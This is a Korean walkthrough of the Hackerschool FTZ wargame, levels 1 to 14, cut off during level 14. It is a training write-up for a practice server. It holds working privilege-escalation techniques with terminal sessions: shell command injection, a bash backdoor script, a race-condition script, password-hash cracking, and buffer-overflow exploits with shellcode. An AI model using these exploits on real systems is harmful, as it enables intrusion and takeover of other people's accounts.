@@ -1,0 +1,1581 @@
+          - Paper for hackerschool wargames -
+
+                                  indra <1ndr4@hanmail.net>
+
+wargame address : ftz.hackerschool.org
+
+============================================================
+Problem :: level1
+============================================================
+
+[level2@ftz level2]$ cat hint
+
+"level2 권한에 setuid가 걸린 파일을 찾는다." 
+
+[level2@ftz level2]$
+
+============================================================
+
+[level1@ftz level1]$ find / -user level2 -group level1 -perm -4000 2>/dev/null
+/bin/ExcuteMe
+[level1@ftz level1]$ /bin/ExcuteMe
+
+
+
+                레벨2의 권한으로 당신이 원하는 명령어를
+                한가지 실행시켜 드리겠습니다.
+                (단, my-pass 와 chmod는 제외)
+
+                어떤 명령을 실행시키겠습니까?
+
+
+                [level2@ftz level2]$ /bin/bash
+
+
+[level2@ftz level2]$ id
+uid=3002(level2) gid=3001(level1) groups=3001(level1)
+[level2@ftz level2]$ 
+
+============================================================
+Problem :: level2
+============================================================
+
+[level2@ftz level2]$ cat hint
+
+
+텍스트 파일 편집 중 쉘의 명령을 실행시킬 수 있다는데...
+
+
+[level2@ftz level2]$
+
+============================================================
+
+[level2@ftz level2]$ find / -user level3 -group level2 -perm +4000 2>/dev/null
+/usr/bin/editor
+[level2@ftz level2]$ /usr/bin/editor
+~
+~
+~
+~
+~
+~                              VIM - Vi IMproved
+~
+~                                 version 6.1
+~                           by Bram Moolenaar et al.
+~                 Vim is open source and freely distributable
+~
+~                        Help poor children in Uganda!
+~                type  :help iccf<Enter>       for information
+~
+~                type  :q<Enter>               to exit
+~                type  :help<Enter>  or  <F1>  for on-line help
+~                type  :help version6<Enter>   for version info
+~
+~
+~
+~
+~
+:!bash
+[level3@ftz level2]$ id
+uid=3003(level3) gid=3002(level2) groups=3002(level2)
+[level3@ftz level2]$ 
+
+============================================================
+Problem :: level3
+============================================================
+
+[level3@ftz level3]$ cat hint
+
+
+다음 코드는 autodig의 소스이다.
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main(int argc, char **argv){
+
+    char cmd[100];
+
+    if( argc!=2 ){
+        printf( "Auto Digger Version 0.9\n" );
+        printf( "Usage : %s host\n", argv[0] );
+        exit(0);
+    }
+
+    strcpy( cmd, "dig @" );
+    strcat( cmd, argv[1] );
+    strcat( cmd, " version.bind chaos txt");
+
+    system( cmd );
+
+}
+
+이를 이용하여 level4의 권한을 얻어라.
+
+more hints.
+- 동시에 여러 명령어를 사용하려면?
+- 문자열 형태로 명령어를 전달하려면?
+
+
+[level3@ftz level3]$
+
+============================================================
+
+[level3@ftz level3]$ find / -name autodig 2>/dev/null
+/bin/autodig
+[level3@ftz level3]$ /bin/autodig
+Auto Digger Version 0.9
+Usage : /bin/autodig host
+[level3@ftz level3]$ /bin/autodig "localhost; /usr/bin/id"
+
+; <<>> DiG 9.2.0 <<>> @localhost
+;; global options:  printcmd
+;; connection timed out; no servers could be reached
+Try `/usr/bin/id --help' for more information.
+[level3@ftz level3]$
+
+인자를 "localhost; /usr/bin/id" 로 했을 경우 system() 에서 
+인지하게 되는 문자열 : 
+'dig@localhost; /usr/bin/id  version.bind chaos txt'
+
+[level3@ftz level3]$ /bin/autodig "localhost; /usr/bin/id;"
+
+; <<>> DiG 9.2.0 <<>> @localhost
+;; global options:  printcmd
+;; connection timed out; no servers could be reached
+uid=3004(level4) gid=3003(level3) groups=3003(level3)
+sh: version.bind: command not found
+[level3@ftz level3]$
+
+[level3@ftz level3]$ /bin/autodig "localhost; /bin/bash;"
+
+; <<>> DiG 9.2.0 <<>> @localhost
+;; global options:  printcmd
+;; connection timed out; no servers could be reached
+[level4@ftz level3]$ id
+uid=3004(level4) gid=3003(level3) groups=3003(level3)
+[level4@ftz level3]$ 
+
+============================================================
+Problem :: level4
+============================================================
+
+[level4@ftz level4]$ cat hint
+
+
+누군가 /etc/xinetd.d/에 백도어를 심어놓았다.!
+
+
+[level4@ftz level4]$
+
+============================================================ 
+
+[level4@ftz level4]$ cd /etc/xinetd.d
+[level4@ftz xinetd.d]$ ls
+backdoor     daytime      echo-udp  servers   telnet    wu-ftpd
+chargen      daytime-udp  kotalk    services  time
+chargen-udp  echo         ktalk     sgi_fam   time-udp
+[level4@ftz xinetd.d]$ cat backdoor
+service finger
+{
+        disable = no
+        flags           = REUSE
+        socket_type     = stream
+        wait            = no
+        user            = level5
+        server          = /home/level4/tmp/backdoor
+        log_on_failure  += USERID
+}
+[level4@ftz xinetd.d]$ cd /home/level4/tmp
+[level4@ftz tmp]$ ls -al backdoor
+ls: backdoor: No such file or directory
+[level4@ftz tmp]$ cat > backdoor
+#!/bin/bash
+/bin/bash -i
+[level4@ftz tmp]$ chmod +x backdoor
+
+[ -- other terminal -- ]
+
+telnet> o ftz.hackerschool.org 79
+Trying 218.149.4.90...
+Connected to ftz.hackerschool.org.
+Escape character is '^]'.
+
+bash: no job control in this shell
+stty: standard input: Invalid argument
+readline: warning: rl_prep_terminal: cannot get terminal settings
+[level5@ftz /]$ id
+uid=3005(level5) gid=3005(level5)
+readline: warning: rl_prep_terminal: cannot get terminal settings
+[level5@ftz /]$ readline: warning: rl_prep_terminal: cannot get terminal settings
+[level5@ftz /]$ 
+
+============================================================
+Problem :: level5
+============================================================
+
+[level5@ftz level5]$ cat hint
+
+/usr/bin/level5 프로그램은 /tmp 디렉토리에
+level5.tmp 라는 이름의 임시파일을 생성한다.
+
+이를 이용하여 level6의 권한을 얻어라.
+
+
+[level5@ftz level5]$
+
+============================================================ 
+
+[level5@ftz       ]$ cat > exp.sh
+#!/bin/sh
+while :; do
+nice -n 19 /usr/bin/level5 &
+cp /tmp/level5.tmp . &
+if [ -r "level5.tmp" ]; then
+        cat level5.tmp
+        sleep 1
+        rm -rf level5.tmp
+fi
+done
+[level5@ftz       ]$ chmod +x exp.sh
+[level5@ftz       ]$ ./exp.sh
+.................
+cp: cannot stat `/tmp/level5.tmp': No such file or directory
+cp: cannot stat `/tmp/level5.tmp': No such file or directory
+cp: cannot stat `/tmp/level5.tmp': No such file or directory
+cp: cannot stat `/tmp/level5.tmp': No such file or directory
+cp: cannot stat `/tmp/level5.tmp': No such file or directory
+cp: cannot stat `/tmp/level5.tmp': No such file or directory
+cp: cannot stat `/tmp/level5.tmp': No such file or directory
+cp: cannot stat `/tmp/level5.tmp': No such file or directory
+next password : *************
+^c
+[level5@ftz       ]$
+
+== strings ==
+
+[level5@ftz level5]$ strings /usr/bin/level5
+/lib/ld-linux.so.2
+__gmon_start__
+libc.so.6
+printf
+creat
+remove
+write
+__deregister_frame_info
+exit
+_IO_stdin_used
+__libc_start_main
+strlen
+__register_frame_info
+close
+GLIBC_2.0
+PTRh
+}$h@
+/tmp/level5.tmp
+Can not creat a temporary file.
+next password : *************
+[level5@ftz level5]$  
+
+============================================================
+
+#!/bin/sh
+# Exploit for hackerschool level5
+# indra <1ndr4@hanmail.net>
+#
+while :; do
+
+nice -n 19 /usr/bin/level5 &
+cp /tmp/level5.tmp . &
+
+if [ -r "level5.tmp" ]; then
+        clear
+        cat level5.tmp
+        echo -n "Continue? (y/n) : "
+        read Q
+        if [ $Q = "y" ] || [ $Q = "Y" ]; then
+                rm -rf level5.tmp
+        else
+                exit 0
+        fi
+fi
+done
+
+============================================================
+
+============================================================
+Problem :: level6
+============================================================
+
+hint - 인포샵 bbs의 텔넷 접속 메뉴에서 많이 사용되던 해킹 방법이다. 
+
+============================================================ 
+
+해커스쿨의 Free Training Zone에 오신걸 환영합니다.
+
+일반계정을 사용하실 분은 login: 에 guest를
+
+트레이닝 서비스를 받으실 분은 login: 에 trainer1을
+
+입력하세요.
+
+- 공개계정: guest
+- 트레이닝: trainer1
+- 레벨: level1/level1
+- 대화방 및 머드 게임 서비스 : mud
+
+                               - www.hackerschool.org
+
+※ F.T.Z 사용자들의 작업 기록과 접속 IP는 실시간으로 저장됩니다.
+   만약 F.T.Z 서버에 D.O.S 공격을 시도하거나, F.T.Z를 경유하여
+   타 시스템에 불법적인 접속을 시도하면 각각 정보 통신망 이용 촉진법
+   제62조 제5호와 제29조 제3항에 의거하여 처벌받게 됩니다.
+※ F.T.Z는 사이버 수사대의 로그 기록 요청에 묵인하지 않습니다.
+
+login: level6
+Password:
+Last login: Sat Jan  4 13:38:42 from 61.102.66.253
+
+
+hint - 인포샵 bbs의 텔넷 접속 메뉴에서 많이 사용되던 해킹 방법이다.
+
+
+
+
+  #####################################
+  ##                                 ##
+  ##         텔넷 접속 서비스        ##
+  ##                                 ##
+  ##                                 ##
+  ##     1. 하이텔     2. 나우누리   ##
+  ##     3. 천리안                   ##
+  ##                                 ##
+  #####################################
+
+접속하고 싶은 bbs를 선택하세요 : ^]
+잘못 입력하셨습니다. 접속을 종료합니다.
+[level6@ftz level6]$ id
+uid=3006(level6) gid=3006(level6) groups=3006(level6)
+[level6@ftz level6]$ ls
+hint  password  public_html  tmp  tn
+[level6@ftz level6]$ ls -al password
+-rw-r-----    1 root     level6         36 Mar 24  2000 password
+[level6@ftz level6]$ cat password
+Level7 password is "*************".
+[level6@ftz level6]$ 
+
+============================================================
+Problem :: level7
+============================================================
+
+[level7@ftz level7]$ cat hint
+
+
+/bin/level7 명령을 실행하면, 패스워드 입력을 요청한다.
+
+1. 패스워드는 가까운곳에..
+2. 상상력을 총동원하라.
+3. 2진수를 10진수를 바꿀 수 있는가?
+4. 계산기 설정을 공학용으로 바꾸어라.
+
+
+[level7@ftz level7]$
+
+============================================================ 
+
+[level7@ftz level7]$ /bin/level7
+Insert The Password : 
+올바르지 않은 패스워드 입니다.
+    패스워드는 가까운곳에...
+--_--_- --____- ---_-__ --__-_-
+[level7@ftz level7]$ 
+
+--_--_- --____- ---_-__ --__-_-
+
+binary:
+1101101 1100001 1110100 1100101
+
+Decimal:
+109 97 116 101
+
+Hex:
+6D 61 74 65
+
+[level7@ftz level7]$ perl -e 'print "\x6d\x61\x74\x65\n"'
+mate
+[level7@ftz level7]$
+
+[level7@ftz level7]$ /bin/level7 
+Insert The Password : mate
+
+Congratulation! next password is "***************". 
+
+[level7@ftz level7]$
+
+============================================================
+Problem :: level8
+============================================================
+
+[level8@ftz level8]$ cat hint
+
+
+level9의 shadow 파일이 서버 어딘가에 숨어있다.
+그 파일에 대해 알려진 것은 용량이 "1481"이라는 것 뿐이다.
+
+
+[level8@ftz level8]$
+
+============================================================
+
+[level8@ftz level8]$ find / -group level8 -size 1481c -exec ls -al {} \; 2>/dev/null
+-rw-r-----    1 root     level8       1481 Oct 31 10:03 /etc/rc.d/found.txt
+[level8@ftz level8]$ more /etc/rc.d/found.txt
+level9:$1$vkY6sSlG$6RyUXtNMEVGsfY7Xf0wps.:11040:0:99999:7:-1:-1:134549524
+
+level9:$1$vkY6sSlG$6RyUXtNMEVGsfY7Xf0wps.:11040:0:99999:7:-1:-1:134549524
+level9:$1$vkY6sSlG$6RyUXtNMEVGsfY7Xf0wps.:11040:0:99999:7:-1:-1:134549524
+level9:$1$vkY6sSlG$6RyUXtNMEVGsfY7Xf0wps.:11040:0:99999:7:-1:-1:134549524
+level9:$1$vkY6sSlG$6RyUXtNMEVGsfY7Xf0wps.:11040:0:99999:7:-1:-1:134549524
+level9:$1$vkY6sSlG$6RyUXtNMEVGsfY7Xf0wps.:11040:0:99999:7:-1:-1:134549524
+level9:$1$vkY6sSlG$6RyUXtNMEVGsfY7Xf0wps.:11040:0:99999:7:-1:-1:134549524
+level9:$1$vkY6sSlG$6RyUXtNMEVGsfY7Xf0wps.:11040:0:99999:7:-1:-1:134549524
+level9:$1$vkY6sSlG$6RyUXtNMEVGsfY7Xf0wps.:11040:0:99999:7:-1:-1:134549524
+level9:$1$vkY6sSlG$6RyUXtNMEVGsfY7Xf0wps.:11040:0:99999:7:-1:-1:134549524
+level9:$1$vkY6sSlG$6RyUXtNMEVGsfY7Xf0wps.:11040:0:99999:7:-1:-1:134549524
+level9:$1$vkY6sSlG$6RyUXtNMEVGsfY7Xf0wps.:11040:0:99999:7:-1:-1:134549524
+level9:$1$vkY6sSlG$6RyUXtNMEVGsfY7Xf0wps.:11040:0:99999:7:-1:-1:134549524
+level9:$1$vkY6sSlG$6RyUXtNMEVGsfY7Xf0wps.:11040:0:99999:7:-1:-1:134549524
+level9:$1$vkY6sSlG$6RyUXtNMEVGsfY7Xf0wps.:11040:0:99999:7:-1:-1:134549524
+level9:$1$vkY6sSlG$6RyUXtNMEVGsfY7Xf0wps.:11040:0:99999:7:-1:-1:134549524
+level9:$1$vkY6sSlG$6RyUXtNMEVGsfY7Xf0wps.:11040:0:99999:7:-1:-1:134549524
+level9:$1$vkY6sSlG$6RyUXtNMEVGsfY7Xf0wps.:11040:0:99999:7:-1:-1:134549524
+level9:$1$vkY6sSlG$6RyUXtNMEVGsfY7Xf0wps.:11040:0:99999:7:-1:-1:134549524
+level9:$1$vkY6sSlG$6RyUXtNMEVGsfY7Xf0wps.:11040:0:99999:7:-1:-1:134549524
+[level8@ftz level8]$
+
+[level8@ftz             ]$ wget http://packetstormsecurity.org/Crackers/john-1.6.tar.gz
+--15:12:29--  http://packetstormsecurity.org/Crackers/john-1.6.tar.gz
+           => `john-1.6.tar.gz'
+Resolving packetstormsecurity.org... done.
+Connecting to packetstormsecurity.org[216.177.84.116]:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 497,341 [application/x-tar]
+
+100%[====================================>] 497,341      102.14K/s    ETA 00:00
+
+15:12:34 (102.14 KB/s) - `john-1.6.tar.gz' saved [497341/497341]
+
+[level8@ftz             ]$ tar zxvf john-1.6.tar.gz
+....
+[level8@ftz             ]$ cd john-1.6
+[level8@ftz john-1.6]$ ls -al
+total 20
+drwxrwxr-x    5 level8   level8       4096 Jan  5 15:13 .
+drwxrwxr-x    3 level8   level8       4096 Jan  5 15:13 ..
+drwxrwxr-x    2 level8   level8       4096 Jan  5 15:13 doc
+lrwxrwxrwx    1 level8   level8         10 Jan  5 15:13 README -> doc/README
+drwxrwxr-x    2 level8   level8       4096 Jan  5 15:13 run
+drwxrwxr-x    2 level8   level8       4096 Jan  5 15:13 src
+[level8@ftz john-1.6]$ cd src
+[level8@ftz src]$ ls -al Makefile
+-rw-------    1 level8   level8      13155 Dec  2  1998 Makefile
+[level8@ftz src]$ make generic
+...
+ln -s john ../run/unshadow
+ln -s john ../run/unafs
+ln -s john ../run/unique
+make[1]: Leaving directory `/home/level8/tmp/            /john-1.6/src'
+[level8@ftz src]$ cd ..
+[level8@ftz john-1.6]$ cd run
+[level8@ftz run]$ ls -al john
+-rwxrwxr-x    1 level8   level8     128792 Jan  5 15:20 john
+[level8@ftz run]$ ./john
+
+John the Ripper  Version 1.6  Copyright (c) 1996-98 by Solar Designer
+
+Usage: ./john [OPTIONS] [PASSWORD-FILES]
+-single                   "single crack" mode
+-wordfile:FILE -stdin     wordlist mode, read words from FILE or stdin
+-rules                    enable rules for wordlist mode
+-incremental[:MODE]       incremental mode [using section MODE]
+-external:MODE            external mode or word filter
+-stdout[:LENGTH]          no cracking, just write words to stdout
+-restore[:FILE]           restore an interrupted session [from FILE]
+-session:FILE             set session file name to FILE
+-status[:FILE]            print status of a session [from FILE]
+-makechars:FILE           make a charset, FILE will be overwritten
+-show                     show cracked passwords
+-test                     perform a benchmark
+-users:[-]LOGIN|UID[,..]  load this (these) user(s) only
+-groups:[-]GID[,..]       load users of this (these) group(s) only
+-shells:[-]SHELL[,..]     load users with this (these) shell(s) only
+-salts:[-]COUNT           load salts with at least COUNT passwords only
+-format:NAME              force ciphertext format NAME (DES/BSDI/MD5/BF/AFS/LM)
+-savemem:LEVEL            enable memory saving, at LEVEL 1..3
+[level8@ftz run]$ cat > shadow
+level9:$1$vkY6sSlG$6RyUXtNMEVGsfY7Xf0wps.:11040:0:99999:7:-1:-1:134549524
+[level8@ftz run]$ ./john shadow
+Loaded 1 password (FreeBSD MD5 [32/32])
+*****            (level9)
+guesses: 1  time: 0:00:00:03 100% (2)  c/s: 891  trying: apple
+[level8@ftz run]$ 
+
+============================================================
+Problem :: level9
+============================================================
+
+[level9@ftz level9]$ cat hint
+
+
+다음은 /usr/bin/bof의 소스이다.
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+main(){
+
+  char buf2[10];
+  char buf[10];
+
+  printf("It can be overflow : ");
+  fgets(buf,40,stdin);
+
+  if ( strncmp(buf2, "go", 2) == 0 )
+   {
+        printf("Good Skill!\n");
+        setreuid( 3010, 3010 );
+        system("/bin/bash");
+   }
+
+}
+
+이를 이용하여 level10의 권한을 얻어라.
+
+
+[level9@ftz level9]$
+
+=========================================================== 
+
+[level9@ftz          ]$ /usr/bin/bof
+It can be overflow : AAAAAAAAAAAAAAAAgo
+Good Skill!
+[level10@ftz          ]$ id
+uid=3010(level10) gid=3009(level9) groups=3009(level9)
+[level10@ftz          ]$ 
+
+============================================================
+Problem :: level10
+============================================================
+
+[level10@ftz level10]$ cat hint
+
+
+두명의 사용자가 대화방을 이용하여 비밀스런 대화를 나누고 있다.
+그 대화방은 공유 메모리를 이용하여 만들어졌으며, key_t의 값은
+7530, 대화를 나눌 때 사용하는 변수명은 text라고 한다.
+이를 이용해 두 사람의 대화를 도청하여 hall의 권한을 얻어라.
+
+- 레벨을 완료하셨다면 소스는 지우고 나가주세요.
+
+
+[level10@ftz level10]$
+
+===========================================================
+
+[level10@ftz tmp]$ cat > test.c
+#include <stdio.h>
+#include <sys/shm.h>
+#include <sys/types.h>
+
+#define KEY	7530
+#define	BUFF	1024
+
+int main()
+{
+    void *sh_m = (void *)0;
+    int shmid;
+    char buf[BUFF];
+    shmid = shmget((key_t)KEY, BUFF, 0666);
+    sh_m = shmat(shmid, (void *)0, 0);
+    memcpy(buf, sh_m, BUFF);
+    printf("%s", buf);
+    shmdt(sh_m);
+    return 1;
+}
+[level10@ftz tmp]$ cc -o test test.c
+[level10@ftz tmp]$ ./test
+
+============================================================
+
+/* Exploit for hackerschool level10
+*  Coded by indra (1ndr4@hanmail.net)
+*/
+#include <stdio.h>
+#include <sys/shm.h>
+#include <sys/types.h>
+
+#define KEY	7530
+#define	BUFF	1024
+
+int main()
+{
+    void *sh_m = (void *)0;
+    int shmid;
+    char buf[BUFF];
+    shmid = shmget((key_t)KEY, BUFF, 0666);
+    sh_m = shmat(shmid, (void *)0, 0);
+    memcpy(buf, sh_m, BUFF);
+    printf("%s", buf);
+    shmdt(sh_m);
+    return 1;
+}
+
+============================================================
+Problem :: level11
+============================================================
+
+[level11@ftz level11]$ cat hint
+
+#include <stdio.h>
+#include <stdlib.h>
+ 
+int main( int argc, char *argv[] )
+{
+    char str[256];
+ 
+    strcpy( str, argv[1] );
+    printf( str );
+} 
+
+
+[level11@ftz level11]$ 
+
+============================================================
+
+[level11@ftz                  ]$ find / -user level12 -group level11 -perm -4000 -exec ls -al {} \; 2>/dev/null
+-rwsr-x---    1 level12  level11      4916 Jan 24  1999 /home/level11/attackme
+[level11@ftz                  ]$ ln -sf /home/level11/attackme attackme
+[level11@ftz                  ]$ ls -al
+total 8
+drwxrwxr-x    2 level11  level11      4096 Dec 27 10:11 .
+drwxrwxr-x    4 root     level11      4096 Dec 27 10:10 ..
+lrwxrwxrwx    1 level11  level11        22 Dec 27 10:11 attackme -> /home/level11/attackme
+[level11@ftz                  ]$ ./egg
+Using address: 0xbffffa98
+[level11@ftz                  ]$ perl -e 'system "./attackme", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x98\xfa\xff\xbf"'
+sh-2.05a$ id
+uid=3091(level11) gid=3091(level11) groups=3091(level11)
+sh-2.05a$ quit
+sh: quit: command not found
+sh-2.05a$ exit
+exit
+[level11@ftz                  ]$ exit
+exit
+[level11@ftz                  ]$ grep level12 /etc/passwd
+level12:x:3092:3092::/home/level12:/bin/bash
+[level11@ftz                  ]$ cat > setreuid.c
+#include <unistd.h>
+main()
+{
+        setreuid(3092,3092);
+}
+[level11@ftz                  ]$ cc -o setreuid -static setreuid.c
+....
+[level11@ftz                  ]$ cat > setreuid.s ; gcc -o setreuid setreuid.s
+.globl main
+
+main:
+        movl    $0xc14, %ecx
+        movl    $0xc14, %ebx
+        movl    $0x46, %eax
+        int     $0x80
+
+[level11@ftz                  ]$ objdump -D setreuid | more
+
+080483d0 <main>:
+ 80483d0:       b9 14 0c 00 00          mov    $0xc14,%ecx
+ 80483d5:       bb 14 0c 00 00          mov    $0xc14,%ebx
+ 80483da:       b8 46 00 00 00          mov    $0x46,%eax
+ 80483df:       cd 80                   int    $0x80
+
+[level11@ftz                  ]$ cat > setreuid.s
+.globl main
+
+main:
+        xor     %ecx, %ecx
+        movw    $0xc14, %cx
+        xor     %ebx, %ebx
+        movw    $0xc14, %bx
+        xor     %eax, %eax
+        movb    $0x46, %al
+        int     $0x80
+[level11@ftz                  ]$ gcc -o setreuid setreuid.s ; objdump -D setreuid | more
+
+080483d0 <main>:
+ 80483d0:       31 c9                   xor    %ecx,%ecx
+ 80483d2:       66 b9 14 0c             mov    $0xc14,%cx
+ 80483d6:       31 db                   xor    %ebx,%ebx
+ 80483d8:       66 bb 14 0c             mov    $0xc14,%bx
+ 80483dc:       31 c0                   xor    %eax,%eax
+ 80483de:       b0 46                   mov    $0x46,%al
+ 80483e0:       cd 80                   int    $0x80
+ 80483e2:       89 f6                   mov    %esi,%esi
+
+[level11@ftz                  ]$
+
+
+"\x31\xc9"		/* xor    %ecx,%ecx */
+"\x66\xb9\x14\x0c"	/* mov    $0xc14,%cx */
+"\x31\xdb"		/* xor    %ebx,%ebx */
+"\x66\xbb\x14\x0c"	/* mov    $0xc14,%bx */
+"\x31\xc0"		/* xor    %eax,%eax */
+"\xb0\x46"		/* mov    $0x46,%al */
+"\xcd\x80"		/* int    $0x80 */
+
+[level11@ftz                  ]$ ./ex
+return address : 0xbffffab8
+sh-2.05a$ id
+uid=3092(level12) gid=3091(level11) groups=3091(level11)
+sh-2.05a$ 
+
+============================================================
+
+/* 
+* Exploit for hackerschool level11 
+* Coded by indra(1ndr4@hanmail.net)
+*/
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <sys/types.h>
+
+#define NOP	0x90
+#define TARGET	"/home/level11/attackme"
+#define OFFSET	256
+
+char shellcode[] = 
+	"\x31\xc9"		/* xor    %ecx,%ecx */
+	"\x66\xb9\x14\x0c"	/* mov    $0xc14,%cx */
+	"\x31\xdb"		/* xor    %ebx,%ebx */
+	"\x66\xbb\x14\x0c"	/* mov    $0xc14,%bx */
+	"\x31\xc0"		/* xor    %eax,%eax */
+	"\xb0\x46"		/* mov    $0x46,%al */
+	"\xcd\x80"		/* int    $0x80 */
+	"\x55\x89\xe5\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46" 
+	"\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89" 
+	"\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" 
+	"\x00\xc9\xc3\x90/bin/sh"; 
+
+unsigned long get_esp()
+{
+	__asm__("movl %esp,%eax");
+}
+
+int main()
+{
+	char *ptr, *egg, *cmd;
+	long *addr_ptr, addr;
+	int i;
+
+	if((egg = malloc(2048)) == NULL) {
+		printf("can't allocate memory to egg.\n");
+		exit(0);
+	}
+	
+	if((cmd = malloc(OFFSET+8)) == NULL) {
+		printf("can't allocate memoty to cmd.\n");
+		exit(0);
+	}
+
+	addr = get_esp();
+
+	printf("return address : 0x%x\n", addr);
+	
+	/* for arguments value */
+	ptr = cmd;
+	addr_ptr = (long*)ptr;
+	for(i = 0; i < OFFSET+8; i+=4)
+		*(addr_ptr++) = addr;
+
+	/* for shellcode */
+	ptr = egg;
+	for(i = 0; i < 2048 - strlen(shellcode) -1; i++)
+		*(ptr++) = NOP;
+	for(i = 0; i < strlen(shellcode); i++)
+		*(ptr++) = shellcode[i];
+	
+	egg[2048 - 1] = '\0';
+
+	memcpy(egg, "EGG=", 4);
+	putenv(egg);
+
+	execl(TARGET, "attackme", cmd, 0);
+} /* End of exploit */
+
+============================================================
+Problem :: level12
+============================================================
+
+[level12@ftz level12]$ more hint
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main( void )
+{
+    char str[256];
+
+    printf( "문장을 입력하세요.\n" );
+    gets( str );
+    printf( "%s\n", str );
+}
+
+
+[level12@ftz level12]$
+
+============================================================
+
+	/* setreuid() */
+	"\x31\xc9"		/* xor    %ecx,%ecx */
+	"\x66\xb9\x15\x0c"	/* mov    $0xc15,%cx */
+	"\x31\xdb"		/* xor    %ebx,%ebx */
+	"\x66\xbb\x15\x0c"	/* mov    $0xc15,%bx */
+	"\x31\xc0"		/* xor    %eax,%eax */
+	"\xb0\x46"		/* mov    $0x46,%al */
+	"\xcd\x80"		/* int    $0x80 */
+
+[level12@ftz              ]$ gcc -o egg egg.c
+[level12@ftz              ]$ ./egg
+Using address: 0xbffffaa8
+[level12@ftz              ]$ perl -e 'print "A"x260'
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
+AAAAAAAAAAA[level12@ftz              ]$
+[level12@ftz              ]$ (printf "AAAAA...AAAA\xa8\xfa\xff\xbf"; cat) | /home/level12/attackme
+문장을 입력하세요.
+
+AAAAAAAAAAAAAAAAA...AAAAAAAAAAAAAAAAAAA¾?id
+uid=3093(level13) gid=3092(level12) groups=3092(level12)
+
+============================================================
+Problem :: level13
+============================================================
+
+[level13@ftz level13]$ more hint
+
+#include <stdlib.h>
+
+main(int argc, char *argv[])
+{
+   long i=0x1234567;
+   char buf[1024];
+   if(argc > 1)
+   strcpy(buf,argv[1]);
+   if(i != 0x1234567) {
+   printf(" Warnning: Buffer Overflow !!! \n");
+   kill(0,11);
+   }
+}
+
+[level13@ftz level13]$
+
+============================================================
+/* 
+* Exploit for hackerschool level13 
+* Coded by indra(1ndr4@hanmail.net)
+*/
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <sys/types.h>
+
+#define NOP     0x90
+#define TARGET  "/home/level13/attackme"
+#define OFFSET  1024
+#define DUMMY   0x1234567
+
+char shellcode[] =
+        "\x31\xc9"              /* xor    %ecx,%ecx */
+        "\x66\xb9\x16\x0c"      /* mov    $0xc16,%cx */
+        "\x31\xdb"              /* xor    %ebx,%ebx */
+        "\x66\xbb\x16\x0c"      /* mov    $0xc16,%bx */
+        "\x31\xc0"              /* xor    %eax,%eax */
+        "\xb0\x46"              /* mov    $0x46,%al */
+        "\xcd\x80"              /* int    $0x80 */
+        "\x55\x89\xe5\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46"
+        "\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89"
+        "\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
+        "\x00\xc9\xc3\x90/bin/sh";
+
+unsigned long get_esp()
+{
+        __asm__("movl %esp,%eax");
+}
+
+int main(int argc, char *argv[])
+{
+        char *ptr, *egg, *cmd;
+        long *addr_ptr, addr;
+        int i, offset = 32;
+
+        if((egg = malloc(2048)) == NULL) {
+                printf("can't allocate memory to egg.\n");
+                exit(0);
+        }
+
+        if((cmd = malloc(OFFSET+offset)) == NULL) {
+                printf("can't allocate memoty to cmd.\n");
+                exit(0);
+        }
+
+        addr = get_esp();
+
+        printf("return address : 0x%x\n", addr);
+        printf("offset : %d\n", offset);
+        /* for arguments value */
+        ptr = cmd;
+        addr_ptr = (long*)ptr;
+        for(i = 0; i < OFFSET+offset; i+=4) {
+                if(i == 1024) {
+                        *(addr_ptr++) = DUMMY;
+                }
+                else {
+                        *(addr_ptr++) = addr;
+                }
+        }
+
+        /* for shellcode */
+        ptr = egg;
+        for(i = 0; i < 2048 - strlen(shellcode) -1; i++)
+                *(ptr++) = NOP;
+        for(i = 0; i < strlen(shellcode); i++)
+                *(ptr++) = shellcode[i];
+
+        egg[2048 - 1] = '\0';
+
+        memcpy(egg, "EGG=", 4);
+        putenv(egg);
+
+        execl(TARGET, "attackme", cmd, 0);
+}
+
+============================================================
+
+[level13@ftz                   ]$ ./ex
+return address : 0xbffffa98
+offset : 32
+sh-2.05a$ id
+uid=3094(level14) gid=3093(level13) groups=3093(level13)
+sh-2.05a$ 
+
+============================================================
+Problem :: level14
+============================================================
+
+[level14@ftz level14]$ more hint
+
+레벨14 이후로는 mainsource의 문제를 그대로 가져왔습니다.
+버퍼 오버플로우, 포맷스트링을 학습하는데는 이 문제들이
+최고의 효과를 가져다줍니다.
+
+#include <stdio.h>
+#include <unistd.h>
+
+main()
+{ int crap;
+  int check;
+  char buf[20];
+  fgets(buf,45,stdin);
+  if (check==0xdeadbeef)
+   {
+     setreuid(3095,3095);
+     system("/bin/sh");
+   }
+}
+
+[level14@ftz level14]$
+
+============================================================
+
+[level14@ftz                    ]$ more target.c
+#include <stdio.h>
+#include <unistd.h>
+#include "dumpcode.h"
+main()
+{ int crap;
+  int check = 0xdeadbeef;
+  char buf[20];
+  fgets(buf,45,stdin);
+  dumpcode(buf, 100);
+  if (check==0xdeadbeef)
+   {
+     setreuid(3095,3095);
+     system("/bin/sh");
+   }
+}
+[level14@ftz                    ]$ ./target
+A
